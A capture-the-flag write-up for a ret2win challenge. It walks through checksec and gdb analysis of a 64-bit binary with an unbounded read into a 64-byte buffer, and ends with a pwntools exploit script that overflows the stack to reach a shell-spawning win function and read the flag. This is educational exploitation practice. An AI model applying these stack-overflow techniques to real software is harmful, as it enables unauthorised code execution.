# ramadhan-ctf-ret2win-task-writeup


## step 1 - identifying the binary

```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/1-ret2win/ret2win_handout]
└─$ file main 
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7d79f46d9a1041c05e4a01617f273af183050d0, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/1-ret2win/ret2win_handout]
└─$ checksec --file main        
[*] '/home/kali/Desktop/ramadhan-ctf/1-ret2win/ret2win_handout/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
The binary it 64-bit , it has no canary and it's not position independant which is great , we can't execute shell code in the stack and it's full relro so we can't write anywhere in the binay . Also it's not stripped that means it still contains symbol tables and debugging information . 
## step 2 - running the binary 


```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/1-ret2win/ret2win_handout]
└─$ ./main 
            ════════════════════════════════════════
                      🌙 RAMADHAN KAREEM 🌙
            ════════════════════════════════════════
Welcome to Ramadhan CTF ,In this challenge you just have to eat enough food to get your gift,u can do it!
eat > aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./main
```
i executed the binary and typed a lot of bytes , as you can see i got a segmentation fault , it mean that i wrote somewhere i shouldn't

## step 3 - debugging the binary 


```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/1-ret2win/ret2win_handout]
└─$ gdb -q main

GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.00ms using Python engine 3.13
Reading symbols from main...
(No debugging symbols found in main)
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  read@plt
0x0000000000401070  setvbuf@plt
0x0000000000401080  _start
0x00000000004010b0  _dl_relocate_static_pie
0x00000000004010c0  deregister_tm_clones
0x00000000004010f0  register_tm_clones
0x0000000000401130  __do_global_dtors_aux
0x0000000000401160  frame_dummy
0x0000000000401166  setup
0x00000000004011c7  win
0x00000000004011fb  main
0x0000000000401265  vuln
0x000000000040129c  _fini
gef➤  
```

i used gdb to debug the binary and typed info func to list all the functions and their addresses , we can see the functions we are intrested in (main , vuln , win ).

now i will disassemble the main function using disass main
```gdb
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004011fb <+0>:     push   rbp
   0x00000000004011fc <+1>:     mov    rbp,rsp
   0x00000000004011ff <+4>:     mov    eax,0x0
   0x0000000000401204 <+9>:     call   0x401166 <setup>
   0x0000000000401209 <+14>:    lea    rax,[rip+0xe30]        # 0x402040
   0x0000000000401210 <+21>:    mov    rdi,rax
   0x0000000000401213 <+24>:    call   0x401030 <puts@plt>
   0x0000000000401218 <+29>:    lea    rax,[rip+0xea9]        # 0x4020c8
   0x000000000040121f <+36>:    mov    rdi,rax
   0x0000000000401222 <+39>:    call   0x401030 <puts@plt>
   0x0000000000401227 <+44>:    lea    rax,[rip+0xe12]        # 0x402040
   0x000000000040122e <+51>:    mov    rdi,rax
   0x0000000000401231 <+54>:    call   0x401030 <puts@plt>
   0x0000000000401236 <+59>:    lea    rax,[rip+0xebb]        # 0x4020f8
   0x000000000040123d <+66>:    mov    rdi,rax
   0x0000000000401240 <+69>:    call   0x401030 <puts@plt>
   0x0000000000401245 <+74>:    mov    eax,0x0
   0x000000000040124a <+79>:    call   0x401265 <vuln>
   0x000000000040124f <+84>:    lea    rax,[rip+0xf0c]        # 0x402162
   0x0000000000401256 <+91>:    mov    rdi,rax
   0x0000000000401259 <+94>:    call   0x401030 <puts@plt>
   0x000000000040125e <+99>:    mov    eax,0x0
   0x0000000000401263 <+104>:   pop    rbp
   0x0000000000401264 <+105>:   ret
End of assembler dump.
```
as we can see it's calling vuln let's disassemble it using disass vuln
```gdb
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x0000000000401265 <+0>:     push   rbp
   0x0000000000401266 <+1>:     mov    rbp,rsp
   0x0000000000401269 <+4>:     sub    rsp,0x40
   0x000000000040126d <+8>:     lea    rax,[rip+0xef9]        # 0x40216d
   0x0000000000401274 <+15>:    mov    rdi,rax
   0x0000000000401277 <+18>:    mov    eax,0x0
   0x000000000040127c <+23>:    call   0x401050 <printf@plt>
   0x0000000000401281 <+28>:    lea    rax,[rbp-0x40]
   0x0000000000401285 <+32>:    mov    edx,0xc8
   0x000000000040128a <+37>:    mov    rsi,rax
   0x000000000040128d <+40>:    mov    edi,0x0
   0x0000000000401292 <+45>:    call   0x401060 <read@plt>
   0x0000000000401297 <+50>:    nop
   0x0000000000401298 <+51>:    leave
   0x0000000000401299 <+52>:    ret
End of assembler dump.
```
As we can see the vuln function is doing a very Dangerous thing in the part .
it's reading a 0x40 size buffer (64 bytes) and storing it in a 0xc8 space (200 bytes) , so it doesn't stop us if we exceed 64 bytes of input . And that's how we will overwrite stuff in the stack , overwrite the rbp(base pointer) and take controle of the rip (instruction pointer) which points on the next instruction to be executed .
```gdb
   0x0000000000401281 <+28>:    lea    rax,[rbp-0x40]
   0x0000000000401285 <+32>:    mov    edx,0xc8
   0x000000000040128a <+37>:    mov    rsi,rax
   0x000000000040128d <+40>:    mov    edi,0x0
   0x0000000000401292 <+45>:    call   0x401060 <read@plt>
```
now we know that stack layout is somthing like this 
[ buffer ] : 64 bytes
[ rbp ] : 8 bytes 
[ rip ]  : 8 bytes 
So we need 72 bytes (64+8) to reach the rip

With that being sad , the win function looks interesting . Let's disassemble it using disass win 
```gdb
gef➤  disass win
Dump of assembler code for function win:
   0x00000000004011c7 <+0>:     push   rbp
   0x00000000004011c8 <+1>:     mov    rbp,rsp
   0x00000000004011cb <+4>:     lea    rax,[rip+0xe36]        # 0x402008
   0x00000000004011d2 <+11>:    mov    rdi,rax
   0x00000000004011d5 <+14>:    call   0x401030 <puts@plt>
   0x00000000004011da <+19>:    lea    rax,[rip+0xe2f]        # 0x402010
   0x00000000004011e1 <+26>:    mov    rdi,rax
   0x00000000004011e4 <+29>:    call   0x401030 <puts@plt>
   0x00000000004011e9 <+34>:    lea    rax,[rip+0xe48]        # 0x402038
   0x00000000004011f0 <+41>:    mov    rdi,rax
   0x00000000004011f3 <+44>:    call   0x401040 <system@plt>
   0x00000000004011f8 <+49>:    nop
   0x00000000004011f9 <+50>:    pop    rbp
   0x00000000004011fa <+51>:    ret
End of assembler dump.
```
As we can see it's calling system and passing to it some string , let's examine it using x/s 0x402038
```gdb
gef➤  x/s 0x402038
0x402038:       "/bin/sh"
```
it's /bin/sh , it's clear now , the win function spawn a shell with system("/bin/sh") so our goal here is to reach it .

So we need to input 72 bytes and then the win function 
But before starting to write our exploit we need some a gadget  which are instructions that end with ret.
in this case we will only use ret to aligne our stack . We will use a tool named ropper it will give us all the gadgets in this binary . we will type ropper --f main 
```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/1-ret2win/ret2win_handout]
└─$ ropper --f  main
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
.
.
.
0x0000000000401298: leave; ret; 
0x00000000004011c4: nop; pop rbp; ret; 
0x0000000000401297: nop; leave; ret; 
0x00000000004010df: nop; ret; 
0x0000000000401016: ret;

99 gadgets found
```

as we can see the address of ret it 0x0000000000401016 

Now we have :
win = 0x4011c7
ret = 0x401016 

## step 4 - writing the exploit 
Now finally i wrote my exploit , it worked locally and remotely
```python
from pwn import*

#p = remote("54.247.233.133",1190)

p = process("./main")


win = p64(0x4011c7)

ret = p64(0x401016)

pay = b"A"*72 + ret + win 



p.send(pay)
p.interactive()
```
Now the fun part , let's run our exploit 
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/1-ret2win/ret2win_handout]
└─$ python3 solve.py 
[+] Starting local process './main': pid 31280
[*] Switching to interactive mode
            ════════════════════════════════════════
                      🌙 RAMADHAN KAREEM 🌙
            ════════════════════════════════════════
Welcome to Ramadhan CTF ,In this challenge you just have to eat enough food to get your gift,u can do it!
eat > 

تمت تعبئة الكرش بنجاح
$ ls
flag.txt  main  solve.py
$ cat flag.txt
Spark{sa7a_ech0rba}
$ 
[*] Interrupted
[*] Stopped process './main' (pid 31280)                                             
```
## Final flag 
```bash
Spark{sa7a_ech0rba}
```



















































